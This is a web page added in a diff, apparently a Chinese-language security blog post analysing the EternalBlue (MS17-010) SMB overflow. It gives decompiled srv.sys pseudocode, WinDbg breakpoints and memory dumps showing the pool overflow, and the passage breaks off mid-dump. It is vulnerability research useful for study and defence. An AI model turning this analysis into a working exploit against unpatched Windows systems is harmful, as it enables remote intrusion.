@@ -1,0 +1,450 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="0x00 前言MS17-010让世界又见识到了远程溢出拿shell的故事，尤其是在现如今这样的漏洞少之又少的情况下显得更加震惊，这篇文章主要是为了梳理相关的漏洞点和具体的利用触发流程 0x01 先关注MS17-010中使用的三个关键漏洞第一个：漏洞即Fea list转换NT Fea list触发的overflow；通过srv buff对象覆盖了后续的srvnet buff的结构体 问题出现再Srv">
+<meta property="og:type" content="article">
+<meta property="og:title" content="EternalBlue(MS17-010) 漏洞分析">
+<meta property="og:url" content="http://example.com/2020/03/19/EternalBlue-Vul/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="0x00 前言MS17-010让世界又见识到了远程溢出拿shell的故事，尤其是在现如今这样的漏洞少之又少的情况下显得更加震惊，这篇文章主要是为了梳理相关的漏洞点和具体的利用触发流程 0x01 先关注MS17-010中使用的三个关键漏洞第一个：漏洞即Fea list转换NT Fea list触发的overflow；通过srv buff对象覆盖了后续的srvnet buff的结构体 问题出现再Srv">
+<meta property="og:locale" content="en_US">
+<meta property="article:published_time" content="2020-03-18T16:00:00.000Z">
+<meta property="article:modified_time" content="2022-03-17T05:58:50.027Z">
+<meta property="article:author" content="PENCH3R">
+<meta name="twitter:card" content="summary">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>EternalBlue(MS17-010) 漏洞分析</title>
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 5.4.1"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/category/">Category</a></li><!--
+     --><!--
+       --><li><a href="/tag/">Tag</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" aria-label="Previous post" href="/2020/03/23/Apereo-Cas-Deserialization/"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" aria-label="Next post" href="/2020/02/26/thinkphp6.0-create-file-vul/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Share post" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2020/03/19/EternalBlue-Vul/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2020/03/19/EternalBlue-Vul/&text=EternalBlue(MS17-010) 漏洞分析"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2020/03/19/EternalBlue-Vul/&title=EternalBlue(MS17-010) 漏洞分析"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2020/03/19/EternalBlue-Vul/&is_video=false&description=EternalBlue(MS17-010) 漏洞分析"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=EternalBlue(MS17-010) 漏洞分析&body=Check out this article: http://example.com/2020/03/19/EternalBlue-Vul/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2020/03/19/EternalBlue-Vul/&title=EternalBlue(MS17-010) 漏洞分析"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2020/03/19/EternalBlue-Vul/&title=EternalBlue(MS17-010) 漏洞分析"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2020/03/19/EternalBlue-Vul/&title=EternalBlue(MS17-010) 漏洞分析"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2020/03/19/EternalBlue-Vul/&title=EternalBlue(MS17-010) 漏洞分析"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2020/03/19/EternalBlue-Vul/&name=EternalBlue(MS17-010) 漏洞分析&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2020/03/19/EternalBlue-Vul/&t=EternalBlue(MS17-010) 漏洞分析"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x00-%E5%89%8D%E8%A8%80"><span class="toc-number">1.</span> <span class="toc-text">0x00 前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01-%E5%85%88%E5%85%B3%E6%B3%A8MS17-010%E4%B8%AD%E4%BD%BF%E7%94%A8%E7%9A%84%E4%B8%89%E4%B8%AA%E5%85%B3%E9%94%AE%E6%BC%8F%E6%B4%9E"><span class="toc-number">2.</span> <span class="toc-text">0x01 先关注MS17-010中使用的三个关键漏洞</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x02-%E8%B6%8A%E7%95%8C%E5%A6%82%E4%BD%95%E8%A7%A6%E5%8F%91%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C"><span class="toc-number">3.</span> <span class="toc-text">0x02 越界如何触发命令执行</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x03-%E5%A6%82%E4%BD%95%E9%80%9A%E8%BF%87%E8%AF%B7%E6%B1%82%E8%A7%A6%E5%8F%91%E6%BC%8F%E6%B4%9E"><span class="toc-number">4.</span> <span class="toc-text">0x03 如何通过请求触发漏洞</span></a></li></ol>
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index py4">
+        
+        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        EternalBlue(MS17-010) 漏洞分析
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span itemprop="name">PENCH3R</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2020-03-18T16:00:00.000Z" itemprop="datePublished">2020-03-19</time>
+        
+      
+    </div>
+
+
+      
+    <div class="article-category">
+        <i class="fas fa-archive"></i>
+        <a class="category-link" href="/categories/BinarySecurity/">BinarySecurity</a>
+    </div>
+
+
+      
+
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>MS17-010让世界又见识到了远程溢出拿shell的故事，尤其是在现如今这样的漏洞少之又少的情况下显得更加震惊，这篇文章主要是为了梳理相关的漏洞点和具体的利用触发流程</p>
+<h2 id="0x01-先关注MS17-010中使用的三个关键漏洞"><a href="#0x01-先关注MS17-010中使用的三个关键漏洞" class="headerlink" title="0x01 先关注MS17-010中使用的三个关键漏洞"></a>0x01 先关注MS17-010中使用的三个关键漏洞</h2><p><strong>第一个：漏洞即Fea list转换NT Fea list触发的overflow；通过srv buff对象覆盖了后续的srvnet buff的结构体</strong></p>
+<p>问题出现再SrvOs2FeaListSizeToNt 函数中，伪代码如下：</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">unsigned</span> <span class="type">int</span> __fastcall <span class="title function_">SrvOs2FeaListSizeToNt</span><span class="params">(<span class="type">int</span> pOs2Fea)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v1; <span class="comment">// edi@1</span></span><br><span class="line">  <span class="type">int</span> Length; <span class="comment">// ebx@1</span></span><br><span class="line">  <span class="type">int</span> pBody; <span class="comment">// esi@1</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v4; <span class="comment">// ebx@1</span></span><br><span class="line">  <span class="type">int</span> v5; <span class="comment">// ecx@3</span></span><br><span class="line">  <span class="type">int</span> v8; <span class="comment">// [sp+10h] [bp-8h]@3</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v9; <span class="comment">// [sp+14h] [bp-4h]@1</span></span><br><span class="line"></span><br><span class="line">  v1 = <span class="number">0</span>;</span><br><span class="line">  Length = *(_DWORD *)pOs2Fea;	<span class="comment">// 这里以DWORD类型获取length</span></span><br><span class="line">  pBody = pOs2Fea + <span class="number">4</span>;</span><br><span class="line">  v9 = <span class="number">0</span>;</span><br><span class="line">  v4 = pOs2Fea + Length;</span><br><span class="line">  <span class="keyword">while</span> ( pBody &lt; v4 )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( pBody + <span class="number">4</span> &gt;= v4</span><br><span class="line">      || (v5 = *(_BYTE *)(pBody + <span class="number">1</span>) + *(_WORD *)(pBody + <span class="number">2</span>),</span><br><span class="line">          v8 = *(_BYTE *)(pBody + <span class="number">1</span>) + *(_WORD *)(pBody + <span class="number">2</span>),</span><br><span class="line">          v5 + pBody + <span class="number">5</span> &gt; v4) )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">// 这里以WORD更新length的低位2字节</span></span><br><span class="line">      <span class="comment">// 初始值是0x10000,最终变成了0x1ff7E</span></span><br><span class="line">      *(_WORD *)pOs2Fea = pBody - pOs2Fea;</span><br><span class="line">      <span class="keyword">return</span> v1;	<span class="comment">// 这里返回的大小为后续用于内存申请</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( RtlULongAdd(v1, (v5 + <span class="number">0xC</span>) &amp; <span class="number">0xFFFFFFFC</span>, &amp;v9) &lt; <span class="number">0</span> )</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    v1 = v9;</span><br><span class="line">    pBody += v8 + <span class="number">5</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> v1;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>使用windbg来动态调试，先查询SrvOs2FeaListToNt中 SrvOs2FeaListSizeToNt 调用的结果：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">kd&gt; p</span><br><span class="line">srv!SrvOs2FeaListToNt+0x15:</span><br><span class="line">a6f7a57a 8b7510          mov     esi,dword ptr [ebp+10h]</span><br><span class="line">kd&gt; r</span><br><span class="line">eax=00010fe8 ebx=884241e0 ecx=837a70ea edx=0000008f esi=83797008 edi=837970d8</span><br><span class="line">eip=a6f7a57a esp=90b2bb70 ebp=90b2bb7c iopl=0         nv up ei pl nz ac pe nc</span><br><span class="line">cs=0008  ss=0010  ds=0023  es=0023  fs=0030  gs=0000             efl=00000216</span><br><span class="line">srv!SrvOs2FeaListToNt+0x15:</span><br><span class="line">a6f7a57a 8b7510          mov     esi,dword ptr [ebp+10h] ss:0010:90b2bb8c=90b2bba8</span><br><span class="line"></span><br><span class="line"># 断点</span><br><span class="line">bp srv!SrvOs2FeaListToNt+0x10</span><br><span class="line">bp srv!SrvOs2FeaListToNt+0x33</span><br></pre></td></tr></table></figure>
+
+<p>此时获取到的大小为0x10fe8，后续变更该值进行内存申请(减去9字节)</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">srv!SrvOs2FeaListSizeToNt+0X5E</span><br><span class="line">96759506 2bf0            sub     esi,eax</span><br><span class="line">96759508 668930          mov     word ptr [eax],si		# 这里更新size以WORD类型</span><br></pre></td></tr></table></figure>
+
+<p>调试中可以看到对应的size大小</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">kd&gt; r</span><br><span class="line">eax=a381b0d8 ebx=0000008f ecx=a382b0ea edx=0000008f esi=0000ff7e edi=a382b0d8</span><br><span class="line">eip=96759508 esp=8ca43b54 ebp=8ca43b64 iopl=0         nv up ei pl nz ac pe nc</span><br><span class="line">cs=0008  ss=0010  ds=0023  es=0023  fs=0030  gs=0000             efl=00000216</span><br><span class="line">srv!SrvOs2FeaListSizeToNt+0x60:</span><br><span class="line">96759508 668930          mov     word ptr [eax],si        ds:0023:a381b0d8=0000</span><br></pre></td></tr></table></figure>
+
+<p>si为: 0xff7e, 在SrvOs2FeaListToNt函数中获取到size值后会引用该值设置边界值，伪代码如下：</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">unsigned</span> <span class="type">int</span> __fastcall <span class="title function_">SrvOs2FeaListToNt</span><span class="params">(<span class="type">int</span> pOs2Fea, <span class="type">int</span> *pArgNtFea, <span class="type">int</span> *a3, _WORD *a4)</span></span><br><span class="line">&#123;</span><br><span class="line">  __int16 v5; <span class="comment">// bx@1</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> Size; <span class="comment">// eax@1</span></span><br><span class="line">  NTFEA *pNtFea; <span class="comment">// ecx@3</span></span><br><span class="line">  <span class="type">int</span> pOs2FeaBody; <span class="comment">// esi@9</span></span><br><span class="line">  <span class="type">int</span> v10; <span class="comment">// edx@9</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v11; <span class="comment">// esi@14</span></span><br><span class="line">  <span class="type">int</span> v12; <span class="comment">// [sp+Ch] [bp-Ch]@11</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v14; <span class="comment">// [sp+20h] [bp+8h]@9</span></span><br><span class="line"></span><br><span class="line">  v5 = <span class="number">0</span>;</span><br><span class="line">  Size = SrvOs2FeaListSizeToNt(pOs2Fea);	<span class="comment">// 获取的大小为0x10fe8</span></span><br><span class="line">  *a3 = Size;</span><br><span class="line">  <span class="keyword">if</span> ( !Size )</span><br><span class="line">  &#123;</span><br><span class="line">    *a4 = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0xC098F0FF</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  pNtFea = (NTFEA *)SrvAllocateNonPagedPool(Size, <span class="number">0x15</span>);	<span class="comment">// 内存申请</span></span><br><span class="line">  *pArgNtFea = (<span class="type">int</span>)pNtFea;</span><br><span class="line">  <span class="keyword">if</span> ( pNtFea )</span><br><span class="line">  &#123;</span><br><span class="line">    pOs2FeaBody = pOs2Fea + <span class="number">4</span>;		<span class="comment">// 后续引用该值为遍历的起始地址</span></span><br><span class="line">    v10 = (<span class="type">int</span>)pNtFea;</span><br><span class="line">    v14 = pOs2Fea + *(_DWORD *)pOs2Fea - <span class="number">5</span>;		<span class="comment">// 这里设置边界地址size-5</span></span><br><span class="line">    <span class="keyword">if</span> ( pOs2Fea + <span class="number">4</span> &gt; v14 )</span><br><span class="line">    &#123;</span><br><span class="line">LABEL_13:</span><br><span class="line">      <span class="keyword">if</span> ( pOs2FeaBody == pOs2Fea + *(_DWORD *)pOs2Fea )</span><br><span class="line">      &#123;</span><br><span class="line">        *(_DWORD *)v10 = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      v11 = <span class="number">0xC0000001</span>;</span><br><span class="line">      *a4 = v5 - pOs2Fea;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">while</span> ( !(*(_BYTE *)pOs2FeaBody &amp; <span class="number">0x7F</span>) )</span><br><span class="line">      &#123;</span><br><span class="line">        v12 = (<span class="type">int</span>)pNtFea;</span><br><span class="line">        v5 = pOs2FeaBody;		<span class="comment">// 起始地址</span></span><br><span class="line">        pNtFea = (NTFEA *)SrvOs2FeaToNt(pNtFea, pOs2FeaBody);	<span class="comment">// memmove触发</span></span><br><span class="line">        pOs2FeaBody += *(_BYTE *)(pOs2FeaBody + <span class="number">1</span>) + *(_WORD *)(pOs2FeaBody + <span class="number">2</span>) + <span class="number">5</span>;</span><br><span class="line">		<span class="comment">// 目标地址pNtFea的大小为：0x10fe8</span></span><br><span class="line">        <span class="comment">// 源地址pOs2FeaBody的大小为：0x1ff75</span></span><br><span class="line">        <span class="comment">// 此时发生了越界操作</span></span><br><span class="line">        <span class="keyword">if</span> ( pOs2FeaBody &gt; v14 )</span><br><span class="line">        &#123;</span><br><span class="line">          v10 = v12;</span><br><span class="line">          <span class="keyword">goto</span> LABEL_13;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      *a4 = pOs2FeaBody - pOs2Fea;</span><br><span class="line">      v11 = <span class="number">0xC000000D</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    SrvFreeNonPagedPool(*pArgNtFea);</span><br><span class="line">    <span class="keyword">return</span> v11;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( BYTE1(WPP_GLOBAL_Control-&gt;Flags) &gt;= <span class="number">2u</span> &amp;&amp; WPP_GLOBAL_Control-&gt;Characteristics &amp; <span class="number">1</span> &amp;&amp; KeGetCurrentIrql() &lt; <span class="number">2u</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    _DbgPrint(<span class="string">&quot;SrvOs2FeaListToNt: Unable to allocate %d bytes from nonpaged pool.&quot;</span>, *a3, <span class="number">0</span>);</span><br><span class="line">    _DbgPrint(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0xC0000205</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>动态调试以下汇编代码可以获取到用于边界判断的地址范c围：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">a6f7a5f1 f6067f          test    byte ptr [esi],7Fh</span><br><span class="line">a6f7a5f4 753c            jne     srv!SrvOs2FeaListToNt+0xcd (a6f7a632)</span><br><span class="line">a6f7a5f6 56              push    esi			// 这里为起始地址</span><br><span class="line">a6f7a5f7 50              push    eax</span><br><span class="line">a6f7a5f8 894508          mov     dword ptr [ebp+8],eax</span><br><span class="line">a6f7a5fb 8975fc          mov     dword ptr [ebp-4],esi</span><br><span class="line">a6f7a5fe e828fcffff      call    srv!SrvOs2FeaToNt (a6f7a22b)</span><br><span class="line">a6f7a603 0fb65601        movzx   edx,byte ptr [esi+1]</span><br><span class="line">a6f7a607 0fb74e02        movzx   ecx,word ptr [esi+2]</span><br><span class="line">a6f7a60b 03d6            add     edx,esi</span><br><span class="line">a6f7a60d 8d740a05        lea     esi,[edx+ecx+5]</span><br><span class="line">a6f7a611 3bf3            cmp     esi,ebx		// 获取ebx即可得到边界地址</span><br><span class="line"></span><br><span class="line"># 断点</span><br><span class="line">bp srv!SrvOs2FeaListToNt+0x91	获取起始地址</span><br><span class="line">bp srv!SrvOs2FeaListToNt+0xac	获取边界地址</span><br></pre></td></tr></table></figure>
+
+<p>通过边界地址-起始地址可以得到具体的大小</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">srv!SrvOs2FeaListToNt+0x91:</span><br><span class="line">a6f7a5f6 56              push    esi</span><br><span class="line">kd&gt; r</span><br><span class="line">eax=865a5008 ebx=8ef72051 ecx=0001ff7e edx=00000000 esi=8ef520dc edi=8ef520d8</span><br><span class="line">eip=a6f7a5f6 esp=8ba67b6c ebp=8ba67b7c iopl=0         nv up ei pl zr na pe nc</span><br><span class="line">cs=0008  ss=0010  ds=0023  es=0023  fs=0030  gs=0000             efl=00000246</span><br><span class="line">srv!SrvOs2FeaListToNt+0x91:</span><br><span class="line">a6f7a5f6 56              push    esi</span><br><span class="line"></span><br><span class="line">srv!SrvOs2FeaListToNt+0xac:</span><br><span class="line">a6f7a611 3bf3            cmp     esi,ebx</span><br><span class="line">kd&gt; r</span><br><span class="line">eax=865a5014 ebx=8ef72051 ecx=00000000 edx=8ef520dc esi=8ef520e1 edi=8ef520d8</span><br><span class="line">eip=a6f7a611 esp=8ba67b6c ebp=8ba67b7c iopl=0         nv up ei ng nz na po nc</span><br><span class="line">cs=0008  ss=0010  ds=0023  es=0023  fs=0030  gs=0000             efl=00000282</span><br><span class="line">srv!SrvOs2FeaListToNt+0xac:</span><br><span class="line">a6f7a611 3bf3            cmp     esi,ebx</span><br><span class="line"></span><br><span class="line">ebx - esi = 0x8ef72051 - 0x8ef520dc = 0x1ff75</span><br></pre></td></tr></table></figure>
+
+<p>在前面SrvOs2FeaListSizeToNt获取的大小也就是申请的内存大小为：0x10fe8，而使用的边界大小为：0x1ff75(这里为什么与size有出入是因为起始地址移动了4字节，同时边界大小也减小了5字节)</p>
+<p>为了查看溢出覆盖的具体细节，需要定位到执行最后一次memmove的操作：</p>
+<ul>
+<li>通过while循环跳出，在跳出位置下断点，计算循环了多少次</li>
+<li>直接通过memmove设置条件断点(通过payload知道大部分的操作复制字节数都为0)</li>
+</ul>
+<p>SrvOs2FeaToNt伪代码：</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">unsigned</span> <span class="type">int</span> __fastcall <span class="title function_">SrvOs2FeaToNt</span><span class="params">(<span class="type">int</span> a1, <span class="type">int</span> a2)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v4; <span class="comment">// edi@1</span></span><br><span class="line">  _BYTE *v5; <span class="comment">// edi@1</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> result; <span class="comment">// eax@1</span></span><br><span class="line"></span><br><span class="line">  v4 = a1 + <span class="number">8</span>;</span><br><span class="line">  *(_BYTE *)(a1 + <span class="number">4</span>) = *(_BYTE *)a2;</span><br><span class="line">  *(_BYTE *)(a1 + <span class="number">5</span>) = *(_BYTE *)(a2 + <span class="number">1</span>);</span><br><span class="line">  *(_WORD *)(a1 + <span class="number">6</span>) = *(_WORD *)(a2 + <span class="number">2</span>);</span><br><span class="line">  _memmove((<span class="type">void</span> *)(a1 + <span class="number">8</span>), (<span class="type">const</span> <span class="type">void</span> *)(a2 + <span class="number">4</span>), *(_BYTE *)(a2 + <span class="number">1</span>));</span><br><span class="line">  v5 = (_BYTE *)(*(_BYTE *)(a1 + <span class="number">5</span>) + v4);</span><br><span class="line">  *v5++ = <span class="number">0</span>;</span><br><span class="line">  _memmove(v5, (<span class="type">const</span> <span class="type">void</span> *)(a2 + <span class="number">5</span> + *(_BYTE *)(a1 + <span class="number">5</span>)), *(_WORD *)(a1 + <span class="number">6</span>)); <span class="comment">//这里产生的越界覆盖</span></span><br><span class="line">  result = (<span class="type">unsigned</span> <span class="type">int</span>)&amp;v5[*(_WORD *)(a1 + <span class="number">6</span>) + <span class="number">3</span>] &amp; <span class="number">0xFFFFFFFC</span>;</span><br><span class="line">  *(_DWORD *)a1 = result - a1;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>第一种：判定while循环执行了多少次c</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 这里通过临时寄存器来计数</span><br><span class="line">r $t0=0</span><br><span class="line"></span><br><span class="line"># a6f7a5f4 753c            jne     srv!SrvOs2FeaListToNt+0xcd (a6f7a632)</span><br><span class="line">bp srv!SrvOs2FeaListToNt+0x8f &quot;.if (@zf=0) &#123;&#125; .else &#123;gc&#125;&quot;</span><br><span class="line"></span><br><span class="line"># a6f7a5f6 56              push    esi			// 这里为起始地址</span><br><span class="line">bp srv!SrvOs2FeaListToNt+0x91 &quot;r $t0=@$t0+1;g;&quot;</span><br><span class="line"></span><br><span class="line"># 查看计数</span><br><span class="line">kd&gt; r $t0</span><br><span class="line">$t0=0000025b</span><br></pre></td></tr></table></figure>
+
+<p>第二种：通过srv!SrvOs2FeaToNt中的memmove下断进行定位</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">bp srv!SrvOs2FeaToNt+0x4d &quot;.if (poi(esp+8) != 0) &#123;gc&#125; .else &#123;&#125;&quot;</span><br></pre></td></tr></table></figure>
+
+<p>这里是因为payload知道了memmove前面都是进行0字节的copy。</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">kd&gt; dd esp</span><br><span class="line">94b1bb38  86adec31 a2e86c99 0000f3bd 86adec30</span><br><span class="line"></span><br><span class="line">kd&gt; dd esp</span><br><span class="line">94b1bb38  86aedff9 a2e9605b 0000008f 86aedff8		// 最后一次的大小为0x8f</span><br></pre></td></tr></table></figure>
+
+<p>通过上面可以知道，目标地址为：86aedff9，复制的字节数为：0x8f；</p>
+<p>接着查看pool信息：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">kd&gt; !pool 86aedff9</span><br><span class="line">Pool page 86aedff9 region is Nonpaged pool</span><br><span class="line">*86add000 : large page allocation, Tag is LSdb, size is 0x11000 bytes</span><br><span class="line">		Pooltag LSdb : data buffer</span><br><span class="line">		</span><br><span class="line">kd&gt; ? 86aedff9 +8f</span><br><span class="line">Evaluate expression: -2035359608 = 86aee088		// 越界后结束地址</span><br><span class="line"></span><br><span class="line">kd&gt; !pool 86aee088</span><br><span class="line">Pool page 86aee088 region is Nonpaged pool</span><br><span class="line"> 86aee000 size:    8 previous size:    0  (Free)       ....</span><br><span class="line">*86aee000 : large page allocation, Tag is LSbf, size is 0x11000 bytes</span><br><span class="line">		Pooltag LSbf : buffer descriptor</span><br></pre></td></tr></table></figure>
+
+<p>发生了越界覆盖</p>
+<p>查看覆盖前的内存信息：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">kd&gt; db 86aee000 86aee000+88</span><br><span class="line">86aee000  00 10 01 00 00 00 00 00-ff ff 00 00 00 00 00 00  ................</span><br><span class="line">86aee010  ff ff 00 00 c0 f0 df ff-c0 f0 df ff 00 00 00 00  ................</span><br><span class="line">86aee020  00 00 00 00 64 0b 00 00-00 f1 df ff 00 00 00 00  ....d...........</span><br><span class="line">86aee030  00 00 00 00 10 e0 ae 86-00 f1 df ff 00 00 00 00  ................</span><br><span class="line">86aee040  60 00 04 10 00 00 00 00-80 ef df ff 00 00 00 00  `...............</span><br><span class="line">86aee050  10 00 d0 ff ff ff ff ff-10 01 d0 ff ff ff ff ff  ................</span><br><span class="line">86aee060  00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00  ................</span><br><span class="line">86aee070  60 00 04 10 00 00 00 00-00 00 00 00 00 00 00 00  `...............</span><br><span class="line">86aee080  90 ff cf ff ff ff ff ff-fa </span><br></pre></td></tr></table></figure>
+
+<p>查看覆盖后的内存信息：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">kd&gt; db 86aee000 86aee000+88</span><br><span class="line">86aee000  00 10 01 00 00 00 00 00-ff ff 00 00 00 00 00 00  ................</span><br><span class="line">86aee010  ff ff 00 00 00 00 00 00-00 00 00 00 00 00 00 00  ................</span><br><span class="line">86aee020  00 00 00 00 00 00 00 00-00 f1 df ff 00 00 00 00  ................</span><br><span class="line">86aee030  00 00 00 00 20 f0 df ff-00 f1 df ff 00 00 00 00  .... ...........</span><br><span class="line">86aee040  60 00 04 10 00 00 00 00-80 ef df ff 00 00 00 00  `...............</span><br><span class="line">86aee050  10 00 d0 ff ff ff ff ff-10 01 d0 ff ff ff ff ff  ................</span><br><span class="line">86aee060  00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00  ................</span><br><span class="line">86aee070  60 00 04 10 00 00 00 00-00 00 00 00 00 00 00 00  `...............</span><br><span class="line">86aee080  90 ff cf ff ff ff ff 